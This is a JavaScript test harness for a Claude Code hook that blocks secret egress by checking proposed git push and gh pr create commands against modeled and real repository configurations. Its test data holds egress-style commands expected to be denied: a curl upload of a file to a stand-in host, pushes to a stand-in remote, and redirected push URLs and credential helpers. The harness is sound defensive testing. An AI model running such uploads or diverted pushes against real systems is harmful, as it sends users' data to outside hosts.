'use strict';

// Every proposed command is Hook input DATA. The finite model never starts Git,
// gh, a shell, helpers, or a network client, and never reads their configuration.
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const crypto = require('node:crypto');
const { spawnSync } = require('node:child_process');
const FILES = ['block-secret-egress.cjs', 'lib/git-guard-common.cjs',
  'lib/git-precommit-readers.cjs', 'lib/executable-identity.cjs'];
const URL = 'https://github.com/theosera/obsidian-ai-pipeline.git';
const q = value => "'" + value.replace(/'/g, "'\\''") + "'";
const digest = bytes => crypto.createHash('sha256').update(bytes).digest('hex');

function observe(result) {
  if (result.error || result.status !== 0 || result.signal || result.stderr !== '') return 'BROKEN';
  if (result.stdout === '') return 'ALLOW';
  let wire;
  try { wire = JSON.parse(result.stdout)?.hookSpecificOutput; } catch { return 'BROKEN'; }
  if (wire?.permissionDecision !== 'deny' || typeof wire.permissionDecisionReason !== 'string') return 'BROKEN';
  return wire.permissionDecisionReason.startsWith('[禁止] ') ? 'FORBIDDEN' :
    wire.permissionDecisionReason.startsWith('[判断不能] ') ? 'UNKNOWN' : 'BROKEN';
}

function run(hooks, options = {}) {
  const root = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), 'cx-1106-4-fixture-')));
  const T = path.join(root, 'T'), U = path.join(root, 'U'), home = path.join(root, 'home');
  const preload = path.join(root, 'model.cjs'), modelFile = path.join(root, 'model.json');
  const statsFile = path.join(root, 'stats.json');
  try {
    for (const dir of [T, U, home, path.join(T, '.git')]) fs.mkdirSync(dir);
    fs.mkdirSync(path.join(T, '.git', 'objects'));
    fs.mkdirSync(path.join(T, '.git', 'refs'));
    fs.writeFileSync(path.join(T, '.git', 'HEAD'), 'ref: refs/heads/main\n');
    fs.writeFileSync(path.join(T, '.git', 'config'), '[core]\n repositoryformatversion = 0\n bare = false\n');
    const defaultHook = path.join(T, '.git', 'hooks', 'pre-push');
    const configuredHook = path.join(T, 'selected-hooks', 'pre-push');
    for (const file of [defaultHook, configuredHook]) fs.mkdirSync(path.dirname(file));
    const sourceNames = ['pre-push', 'reference-transaction', 'DUMMY.sample', 'DUMMY-source'];
    fs.writeFileSync(preload, `
'use strict';
const fs=require('node:fs'),cp=require('node:child_process'),path=require('node:path');
const model=JSON.parse(fs.readFileSync(${JSON.stringify(modelFile)},'utf8'));
const stats={modeledGetters:0,nativeExecutions:0,unexpectedAttempts:0,settingsAccesses:0,sourceIdentityDifferences:0};
let selectedHookPath=null,selectedHookObserved=false;
const save=()=>fs.writeFileSync(${JSON.stringify(statsFile)},JSON.stringify(stats));
const installed=new Set(['/usr/bin/gh','/usr/bin/git']);
const anchors=new Set(['/usr/bin','/bin','/usr/sbin','/sbin','/usr/local/bin','/opt/homebrew/bin']);
const selected=file=>typeof file==='string'&&['gh','git'].includes(path.basename(file))&&anchors.has(path.dirname(file));
const missing=()=>{throw Object.assign(Error('CX-1106-4 absent modeled installation'),{code:'ENOENT'});};
const stat=fs.statSync,access=fs.accessSync,real=fs.realpathSync,native=fs.realpathSync.native,read=fs.readFileSync;
const readdir=fs.readdirSync;
fs.readdirSync=function(file,...args){if(model.directoryReadError&&[${JSON.stringify(path.dirname(defaultHook))},${JSON.stringify(path.dirname(configuredHook))}].includes(file))throw Object.assign(Error('CX-1107-4 fixture read unavailable'),{code:'EACCES'});return readdir.call(this,file,...args);};
const settings=file=>typeof file==='string'&&path.basename(file)==='settings.json';
fs.statSync=function(file,...args){if(selected(file))return installed.has(file)?{isFile:()=>true,isDirectory:()=>false}:missing();return stat.call(this,file,...args);};
fs.accessSync=function(file,...args){
 if(model.exactPathCase&&selectedHookPath!==null&&!selectedHookObserved&&typeof file==='string'&&path.basename(file)==='pre-push'){
   selectedHookObserved=true;if(file!==selectedHookPath){stats.sourceIdentityDifferences++;save();}
 }
 if(selected(file))return installed.has(file)?undefined:missing();return access.call(this,file,...args);
};
fs.realpathSync=function(file,...args){if(selected(file))return installed.has(file)?file:missing();return real.call(this,file,...args);};
fs.realpathSync.native=function(file,...args){if(selected(file))return installed.has(file)?file:missing();return native.call(this,file,...args);};
fs.readFileSync=function(file,...args){if(settings(file)){stats.settingsAccesses++;save();throw Error('CX-1106-4 settings access forbidden');}return read.call(this,file,...args);};
function getter(file,args,opts={}){
 if(file!=='/usr/bin/git'||opts.cwd!==${JSON.stringify(T)}||opts.shell===true||!Array.isArray(args))return null;
 if(args[0]!=='--no-pager'||args[1]!=='--no-lazy-fetch')return null;
 const tail=args.slice(2);let status=0,text;
 if(tail.length===1&&tail[0]==='--version')text=(model.banner||'git version 2.54.0')+'\\n';
 else if(tail.length===6&&JSON.stringify(tail.slice(0,5))===JSON.stringify(['config','--includes','--show-scope','--null','--get-regexp'])){
   const hookConfig=tail[5]==='^hook\\\\.';
   const records=hookConfig?(model.hookRecords||[]):tail[5].startsWith('^(push')?(model.operationRecords||[]):model.records;
   text=records.map(record=>{const [scope,key,value]=record.length===3?record:['local',...record];return scope+'\\0'+key+'\\n'+value+'\\0';}).join('');status=hookConfig&&model.hookConfigStatus!==undefined?model.hookConfigStatus:text?0:1;
 }else if(tail.length===5&&JSON.stringify(tail.slice(0,4))===JSON.stringify(['rev-parse','--symbolic-full-name','--verify','--end-of-options'])){
   text=(model.branchPrefix||'refs/heads/')+tail[4]+'\\n';status=model.branchStatus||0;
 }else if(tail.length===4&&JSON.stringify(tail.slice(0,3))===JSON.stringify(['rev-parse','--path-format=absolute','--git-path'])&&['hooks/pre-push','hooks/reference-transaction'].includes(tail[3])){
   const isReference=tail[3]==='hooks/reference-transaction',provided=isReference?model.referenceHookText:model.hookText;
   const selectedPath=path.join(model.hookSelection==='configured'?${JSON.stringify(path.dirname(configuredHook))}:${JSON.stringify(path.dirname(defaultHook))},path.basename(tail[3]));
   const returnedPath=model.exactPathCase&&!isReference?path.dirname(selectedPath)+path.sep+path.sep+path.basename(selectedPath):selectedPath;
   if(!isReference)selectedHookPath=returnedPath;
   text=provided===undefined?returnedPath+'\\n':provided;
   status=(isReference?model.referenceHookStatus:model.hookStatus)||0;
 }else if(tail.length===5&&JSON.stringify(tail.slice(0,4))===JSON.stringify(['remote','get-url','--push','--all'])&&Object.hasOwn(model.routes,tail[4])){
   text=model.routes[tail[4]].join('\\n')+'\\n';
 }else return null;
 stats.modeledGetters++;save();return {status,stdout:Buffer.from(text),stderr:Buffer.alloc(0),signal:null};
}
const fail=()=>{stats.unexpectedAttempts++;save();throw Error('CX-1106-4 native child forbidden');};
cp.spawnSync=function(file,args,opts){return getter(file,args,opts)||fail();};
cp.execFileSync=function(file,args,opts){const result=getter(file,args,opts);if(!result||result.status!==0)return fail();return opts?.encoding?result.stdout.toString(opts.encoding):result.stdout;};
for(const name of ['spawn','exec','execSync','execFile','fork'])cp[name]=fail;
save();
`);
    const env = { PATH: '/usr/bin:/bin', HOME: home, XDG_CONFIG_HOME: home,
      TMPDIR: root, LANG: 'C', LC_ALL: 'C', CLAUDE_PROJECT_DIR: T,
      GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: os.devNull, GIT_CONFIG_SYSTEM: os.devNull,
      GIT_TERMINAL_PROMPT: '0' };
    const prefix = 'cd ' + q(T) + ' && ';
    const push = 'git push origin claude/fixture';
    const pr = 'gh pr create --repo o/r --head claude/fixture --title ordinary --body ordinary';
    const ordinary = { records: [['remote.origin.url', URL], ['remote.other.url', URL]], routes: { origin: [URL], other: [URL] } };
    const withURL = url => ({ records: [['remote.origin.url', url]], routes: { origin: [url] } });
    const cases = [
      ['A01', pr, 'ALLOW'],
      ['A02', prefix + pr, 'ALLOW'],
      ['A03', prefix + push, 'ALLOW', null, true],
      ['A04', prefix + 'git push -u origin claude/fixture', 'ALLOW', null, true],
      ['A05', prefix + 'git push --set-upstream origin claude/fixture', 'ALLOW', null, true],
      ['A06', prefix + 'git push origin claude/nested/fixture', 'ALLOW', null, true],
      ['D01', prefix + push, 'DENY', withURL('https://receiver.invalid/DUMMY.git')],
      ['D02', prefix + 'git push origin ordinary', 'DENY'],
      ['D03', prefix + push + ' --force', 'DENY'],
      ['D04', prefix + 'git push --force origin claude/fixture', 'DENY'],
      ['D05', prefix + 'git push -f origin claude/fixture', 'DENY'],
      ['D06', prefix + 'git push origin +claude/fixture', 'DENY'],
      ['D07', prefix + 'git push origin claude/fixture:main', 'DENY'],
      ['D08', prefix + 'git push origin main', 'DENY'],
      ['D09', prefix + 'git push origin claude/fixture --force-with-lease', 'DENY'],
      ['D10', prefix + 'git push other claude/fixture', 'DENY'],
      ['D11', 'cd ' + q(U) + ' && ' + push, 'DENY'],
      ['D12', prefix + 'printf ordinary; ' + push, 'DENY'],
      ['D13', prefix + 'git push origin claude/fixture another', 'DENY'],
      ['D14', prefix + 'git push origin claude/', 'DENY'],
      ['D15', prefix + 'git push origin claude/fixture..other', 'DENY'],
      ['D16', prefix + push, 'DENY', { records: [['remote.origin.url', URL], ['remote.origin.pushurl', 'https://receiver.invalid/DUMMY.git']], routes: { origin: [URL, 'https://receiver.invalid/DUMMY.git'] } }],
      ['D17', prefix + push, 'DENY', { records: [['remote.origin.url', URL], ['credential.helper', 'DUMMY-NONEXECUTED']], routes: { origin: [URL] } }],
      ['D18', 'gh pr create --repo o/r --title ordinary --body ordinary', 'DENY'],
      ['D19', 'gh pr create --repo o/r --head claude/fixture --title ordinary --body-file ordinary.txt', 'DENY'],
      ['D20', prefix + 'gh pr create --repo o/r --head claude/fixture --title ordinary --body-file ordinary.txt', 'DENY'],
      ['D21', 'gh pr create --repo o/r --head claude/fixture --title ordinary', 'DENY'],
      ['D22', pr + ' --fill', 'DENY'],
      ['D23', pr + ' --template ordinary', 'DENY'],
      ['D24', pr + ' --web', 'DENY'],
      ['D25', pr + ' --recover ordinary', 'DENY'],
      ['D26', prefix + push, 'DENY', { ...ordinary, branchPrefix: 'refs/tags/' }],
      ['D27', prefix + push, 'DENY', { ...ordinary, records: ordinary.records.concat([['remote.origin.mirror', 'true']]) }],
      ['D28', prefix + push, 'DENY', { ...ordinary, operationRecords: [['push.default', 'matching']] }],
      ['D29', prefix + push, 'DENY', { ...ordinary, operationRecords: [['submodule.recurse', 'true']] }],
      ['D30', prefix + push, 'DENY', { ...ordinary, branchStatus: 1 }],
      ['D31', prefix + push, 'DENY', { ...ordinary, records: ordinary.records.concat([
        ['remote.origin.push', 'refs/heads/claude/fixture:refs/heads/ordinary'],
      ]) }, false, 'UNKNOWN'],
      ['D32', prefix + push, 'DENY', { ...ordinary, records: ordinary.records.concat([
        ['remote.origin.push', ''],
      ]) }, false, 'UNKNOWN'],
      ['D33', prefix + push, 'DENY', { ...ordinary, records: ordinary.records.concat([
        ['remote.origin.push', 'refs/heads/claude/fixture:refs/heads/claude/fixture'],
        ['remote.origin.push', 'refs/heads/claude/other:refs/heads/claude/other'],
      ]) }, false, 'UNKNOWN'],
      ['C05', 'gh pr merge 1 --body-file ordinary.txt', 'DENY'],
      ['C06', 'curl -q -T ordinary.txt https://receiver.invalid', 'DENY'],
    ];
    const retainedCases = cases.length;
    if (!options.legacyOnly) cases.push(
      ['H01', prefix + push, 'DENY', { ...ordinary, hookMode: 'active' }, false, 'UNKNOWN'],
      ['H02', prefix + push, 'DENY', { ...ordinary, hookSelection: 'configured', hookMode: 'active' }, false, 'UNKNOWN'],
      ['H03', prefix + push, 'ALLOW', { ...ordinary, hookSelection: 'configured' }],
      ['H04', prefix + push, 'ALLOW', { ...ordinary, hookMode: 'inactive' }],
      ['H05', prefix + push, 'ALLOW', { ...ordinary, hookSelection: 'configured', hookMode: 'inactive' }],
      ['H06', prefix + push, 'DENY', { ...ordinary, hookStatus: 1 }, false, 'UNKNOWN'],
      ['H07', prefix + push, 'DENY', { ...ordinary, hookText: 'DUMMY\n' }, false, 'UNKNOWN'],
    );
    const previousCases = cases.length;
    if (options.extended) cases.push(
      ['J01', prefix + push, 'DENY', { ...ordinary, referenceHookMode: 'active' }, false, 'UNKNOWN'],
      ['J02', prefix + push, 'DENY', { ...ordinary, hookSelection: 'configured', referenceHookMode: 'active' }, false, 'UNKNOWN'],
      ['J03', prefix + push, 'ALLOW', { ...ordinary, referenceHookMode: 'inactive' }],
      ['J04', prefix + push, 'ALLOW', { ...ordinary, hookSelection: 'configured', referenceHookMode: 'inactive' }],
      ...['system', 'global', 'local', 'worktree', 'command'].map((scope, index) =>
        ['J' + String(index + 5).padStart(2, '0'), prefix + push, 'DENY',
          { ...ordinary, hookRecords: [[scope, 'hook.DUMMY.command', 'DUMMY_NOT_EXECUTED']] }, false, 'UNKNOWN']),
      ['J10', prefix + push, 'DENY', { ...ordinary, hookRecords: [['hook.DUMMY.enabled', 'false']] }, false, 'UNKNOWN'],
      ['J11', prefix + push, 'DENY', { ...ordinary, hookRecords: [['hook.DUMMY.event', 'DUMMY']] }, false, 'UNKNOWN'],
      ['J12', prefix + push, 'ALLOW', { ...ordinary, extraSource: 'DUMMY.sample', extraMode: 'active' }],
      ['J13', prefix + push, 'DENY', { ...ordinary, extraSource: 'DUMMY-source', extraMode: 'active' }, false, 'UNKNOWN'],
      ['J14', prefix + push, 'ALLOW', { ...ordinary, hookSelection: 'configured', extraSource: 'DUMMY.sample', extraMode: 'active' }],
      ['J15', prefix + push, 'DENY', { ...ordinary, hookSelection: 'configured', extraSource: 'DUMMY-source', extraMode: 'active' }, false, 'UNKNOWN'],
      ['J16', prefix + push, 'DENY', { ...ordinary, directoryReadError: true }, false, 'UNKNOWN'],
      ['J17', prefix + push, 'DENY', { ...ordinary, hookConfigStatus: 2 }, false, 'UNKNOWN'],
      ['J18', prefix + push, 'DENY', { ...ordinary, referenceHookText: 'DUMMY\n' }, false, 'UNKNOWN'],
      ['J19', prefix + push, 'ALLOW', { ...ordinary, extraSource: 'DUMMY-source', extraMode: 'inactive' }],
      ['J20', prefix + push, 'ALLOW', { ...ordinary, hookSelection: 'configured', extraSource: 'DUMMY-source', extraMode: 'inactive' }],
      ['J21', prefix + push, 'ALLOW', { ...ordinary, exactPathCase: true }],
    );
    const sourceBefore = Object.fromEntries(FILES.map(file => [file, digest(fs.readFileSync(path.join(hooks, file)))]));
    const results = [];
    let nativeExecutions = 0, unexpectedAttempts = 0, settingsAccesses = 0, modeledGetters = 0;
    for (const [id, command, expected, model, added, expectedCategory] of cases) {
      const selectedModel = model || ordinary;
      for (const directory of [path.dirname(defaultHook), path.dirname(configuredHook)]) {
        for (const name of sourceNames) fs.rmSync(path.join(directory, name), { force: true });
      }
      fs.writeFileSync(path.join(T, '.git', 'config'), '[core]\n repositoryformatversion = 0\n bare = false\n' +
        (selectedModel.hookSelection === 'configured' ? ' hooksPath = selected-hooks\n' : ''));
      if (selectedModel.hookMode) fs.writeFileSync(
        selectedModel.hookSelection === 'configured' ? configuredHook : defaultHook,
        'DUMMY_NOT_EXECUTED\n', { mode: selectedModel.hookMode === 'active' ? 0o700 : 0o600 });
      const selectedDirectory = selectedModel.hookSelection === 'configured' ? path.dirname(configuredHook) : path.dirname(defaultHook);
      for (const [name, mode] of [['reference-transaction', selectedModel.referenceHookMode],
        [selectedModel.extraSource, selectedModel.extraMode]]) {
        if (mode) fs.writeFileSync(path.join(selectedDirectory, name), 'DUMMY_NOT_EXECUTED\n',
          { mode: mode === 'active' ? 0o700 : 0o600 });
      }
      fs.writeFileSync(modelFile, JSON.stringify(selectedModel));
      const child = spawnSync(process.execPath, ['--require', preload, path.join(hooks, FILES[0])], {
        env, cwd: T, input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, cwd: T }),
        encoding: 'utf8', shell: false, timeout: 15000, maxBuffer: 65536,
      });
      const stats = JSON.parse(fs.readFileSync(statsFile, 'utf8'));
      nativeExecutions += stats.nativeExecutions; unexpectedAttempts += stats.unexpectedAttempts;
      settingsAccesses += stats.settingsAccesses; modeledGetters += stats.modeledGetters;
      const category = observe(child);
      const actual = ['FORBIDDEN', 'UNKNOWN'].includes(category) ? 'DENY' : category;
      results.push({ id, actual, category, expected: options.baseline && added ? 'DENY' : expected,
        sourceIdentityDifferences: stats.sourceIdentityDifferences,
        ...(expectedCategory ? { expectedCategory } : {}) });
    }
    const sourceAfter = Object.fromEntries(FILES.map(file => [file, digest(fs.readFileSync(path.join(hooks, file)))]));
    return { cases: results.length, retainedCases, previousCases, failed: results.filter(row => row.actual !== row.expected || row.sourceIdentityDifferences ||
        row.expectedCategory && row.category !== row.expectedCategory).map(row => row.id),
      broken: results.filter(row => row.actual === 'BROKEN').length, results,
      sourcesUnchanged: JSON.stringify(sourceBefore) === JSON.stringify(sourceAfter),
      nativeExecutions, unexpectedAttempts, settingsAccesses, modeledGetters };
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
}

function runNative(hooks, options = {}) {
  const root = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), 'cx-1107-4-native-')));
  try {
    const T = path.join(root, 'T'), home = path.join(root, 'home');
    const dotgit = path.join(T, '.git'), selected = path.join(T, 'selected-hooks');
    for (const dir of [home, path.join(dotgit, 'objects'), path.join(dotgit, 'refs', 'heads', 'claude'),
      path.join(dotgit, 'hooks'), selected]) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dotgit, 'HEAD'), 'ref: refs/heads/claude/fixture\n');
    fs.writeFileSync(path.join(dotgit, 'refs', 'heads', 'claude', 'fixture'), '1'.repeat(40) + '\n');
    const executable = options.git || '/usr/bin/git';
    const globalConfig = path.join(root, 'global-config');
    const preload = path.join(root, 'native-observer.cjs'), statsFile = path.join(root, 'stats.json');
    fs.writeFileSync(preload, `
'use strict';
const fs=require('node:fs'),cp=require('node:child_process');
const original=cp.spawnSync;
const stats={getters:0,unexpectedAttempts:0,versions:[]};
const save=()=>fs.writeFileSync(${JSON.stringify(statsFile)},JSON.stringify(stats));
function checked(file,args,opts={}){
 const tail=Array.isArray(args)?args.slice(2):[];
 const allowed=file===${JSON.stringify(executable)}&&opts.cwd===${JSON.stringify(T)}&&opts.shell!==true&&
   args[0]==='--no-pager'&&args[1]==='--no-lazy-fetch'&&(
     JSON.stringify(tail)===JSON.stringify(['--version'])||
     tail.length===6&&JSON.stringify(tail.slice(0,5))===JSON.stringify(['config','--includes','--show-scope','--null','--get-regexp'])||
     JSON.stringify(tail)===JSON.stringify(['rev-parse','--symbolic-full-name','--verify','--end-of-options','claude/fixture'])||
     JSON.stringify(tail)===JSON.stringify(['rev-parse','--path-format=absolute','--git-path','hooks/pre-push'])||
     JSON.stringify(tail)===JSON.stringify(['rev-parse','--path-format=absolute','--git-path','hooks/reference-transaction'])||
     JSON.stringify(tail)===JSON.stringify(['remote','get-url','--push','--all','origin']));
 if(!allowed){stats.unexpectedAttempts++;save();throw Error('CX-1107-4 unexpected native operation');}
 stats.getters++;const result=original(file,args,opts);
 if(tail.length===1&&tail[0]==='--version'&&result.status===0)stats.versions.push(result.stdout.toString('utf8').trim());
 save();return result;
}
cp.spawnSync=checked;
cp.execFileSync=function(file,args,opts){const r=checked(file,args,opts);if(r.error||r.signal||r.status!==0)throw Object.assign(Error('CX-1107-4 getter incomplete'),r);return opts?.encoding?r.stdout.toString(opts.encoding):r.stdout;};
for(const name of ['spawn','exec','execSync','execFile','fork'])cp[name]=()=>{stats.unexpectedAttempts++;save();throw Error('CX-1107-4 unexpected child');};
save();
`);
    const env = { PATH: path.dirname(executable) + ':/usr/bin:/bin', HOME: home, XDG_CONFIG_HOME: home, TMPDIR: root,
      LANG: 'C', LC_ALL: 'C', CLAUDE_PROJECT_DIR: T, GIT_CONFIG_NOSYSTEM: '1',
      GIT_CONFIG_GLOBAL: os.devNull, GIT_CONFIG_SYSTEM: os.devNull, GIT_TERMINAL_PROMPT: '0' };
    const config = '[core]\n repositoryformatversion = 0\n bare = false\n';
    const defaultHook = path.join(dotgit, 'hooks', 'pre-push'), configuredHook = path.join(selected, 'pre-push');
    const cases = [
      ['N01', '', null, 'ALLOW'],
      ['N02', 'selected-hooks', null, 'ALLOW'],
      ['N03', path.join(T, 'absent-hooks'), null, 'ALLOW'],
      ['N04', 'selected-hooks', 'inactive', 'ALLOW'],
      ['N05', '', 'active', 'UNKNOWN'],
      ['N06', 'selected-hooks', 'active', 'UNKNOWN'],
    ];
    const previousCases = cases.length;
    if (options.extended) cases.push(
      ['N07', '', null, 'UNKNOWN', { referenceHookMode: 'active' }],
      ['N08', 'selected-hooks', null, 'UNKNOWN', { referenceHookMode: 'active' }],
      ['N09', '', null, 'ALLOW', { referenceHookMode: 'inactive' }],
      ['N10', 'selected-hooks', null, 'ALLOW', { referenceHookMode: 'inactive' }],
      ['N11', '', null, 'ALLOW', { extraSource: 'DUMMY.sample' }],
      ['N12', '', null, 'UNKNOWN', { extraSource: 'DUMMY-source' }],
      ['N13', 'selected-hooks', null, 'ALLOW', { extraSource: 'DUMMY.sample' }],
      ['N14', 'selected-hooks', null, 'UNKNOWN', { extraSource: 'DUMMY-source' }],
      ['N15', '', null, 'UNKNOWN', { hookConfig: '[hook "DUMMY"]\n command = DUMMY_NOT_EXECUTED\n' }],
      ['N16', '', null, 'UNKNOWN', { globalHookConfig: '[hook "DUMMY"]\n enabled = false\n' }],
    );
    const sourceBefore = Object.fromEntries(FILES.map(file => [file, digest(fs.readFileSync(path.join(hooks, file)))]));
    const results = [], versions = new Set(); let nativeGetters = 0, unexpectedAttempts = 0;
    for (const [id, selector, mode, expected, extra = {}] of cases) {
      for (const directory of [path.dirname(defaultHook), path.dirname(configuredHook)]) {
        for (const name of ['pre-push', 'reference-transaction', 'DUMMY.sample', 'DUMMY-source']) {
          fs.rmSync(path.join(directory, name), { force: true });
        }
      }
      fs.writeFileSync(path.join(dotgit, 'config'), config + (selector ? ' hooksPath = ' + selector + '\n' : '') +
        '[remote "origin"]\n url = ' + URL + '\n' + (extra.hookConfig || ''));
      if (mode) fs.writeFileSync(selector ? configuredHook : defaultHook, 'DUMMY_NOT_EXECUTED\n',
        { mode: mode === 'active' ? 0o700 : 0o600 });
      const selectedDirectory = selector ? path.dirname(configuredHook) : path.dirname(defaultHook);
      if (extra.referenceHookMode) fs.writeFileSync(path.join(selectedDirectory, 'reference-transaction'), 'DUMMY_NOT_EXECUTED\n',
        { mode: extra.referenceHookMode === 'active' ? 0o700 : 0o600 });
      if (extra.extraSource) fs.writeFileSync(path.join(selectedDirectory, extra.extraSource), 'DUMMY_NOT_EXECUTED\n', { mode: 0o700 });
      fs.writeFileSync(globalConfig, extra.globalHookConfig || '');
      const selectedEnv = extra.globalHookConfig ? { ...env, GIT_CONFIG_GLOBAL: globalConfig } : env;
      const child = spawnSync(process.execPath, ['--require', preload, path.join(hooks, FILES[0])], {
        cwd: T, env: selectedEnv, encoding: 'utf8', shell: false, timeout: 15000, maxBuffer: 65536,
        input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', cwd: T,
          tool_input: { command: 'cd ' + q(T) + ' && git push origin claude/fixture' } }),
      });
      const stats = JSON.parse(fs.readFileSync(statsFile, 'utf8'));
      nativeGetters += stats.getters; unexpectedAttempts += stats.unexpectedAttempts;
      for (const version of stats.versions) versions.add(version);
      results.push({ id, expected, category: observe(child), getters: stats.getters });
    }
    const sourceAfter = Object.fromEntries(FILES.map(file => [file, digest(fs.readFileSync(path.join(hooks, file)))]));
    return { cases: results.length, previousCases, versions: [...versions], passed: results.filter(row => row.category === row.expected).length,
      broken: results.filter(row => row.category === 'BROKEN').length, nativeGetters, unexpectedAttempts,
      sourcesUnchanged: JSON.stringify(sourceBefore) === JSON.stringify(sourceAfter),
      failed: results.filter(row => row.category !== row.expected).map(row => row.id), results };
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
}

module.exports = { FILES, run, runNative };
